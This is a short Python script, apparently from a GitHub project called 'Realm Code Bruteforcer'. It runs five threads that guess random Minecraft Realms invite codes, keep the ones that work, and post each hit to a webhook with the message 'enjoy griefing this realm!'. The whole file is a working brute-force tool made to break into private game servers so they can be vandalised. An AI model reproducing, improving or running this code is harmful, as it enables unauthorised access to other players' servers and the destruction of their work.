import requests
import random
import string
import threading
# Webhook Settings | WIP
webhook = ""
data = {
  "content": "@everyone Realm code found!",
  "embeds": [
    {
      "title": "Realm Code Bruteforcer",
      "description": "fIt has found a code ({link}), enjoy griefing this realm!",
      "color": 2112716,
      "author": {
        "name": "Developed by yeeterlol",
        "url": "https://github.com/yeeterlol/RCB",
        "icon_url": "https://avatars.githubusercontent.com/u/81702700?v=4"
      }
    }
  ],
  "username": "RCB"
}

def SendRequest():
  while True:
        # printing letters
        letters = string.ascii_letters
        generated = ''.join(random.choice(letters) for i in range(11)) 
        link = f"https://open.minecraft.net/pocket/realms/invite/{generated}"
        r = requests.get(link)
        # Checks status code
        if r.status_code == 404:
            print(f"Invalid | {link}")
        elif r.status_code == 200:
            print(f"Valid | {link}")
            requests.post(webhook, json = data)
        else:
            print(f"Error | {link}")



threads = []

for i in range (5):
  t = threading.Thread(target=SendRequest)
  t.daemon = True
  threads.append(t)

for i in range(5):
  threads[i].start()

for i in range(5):
  threads[i].join()
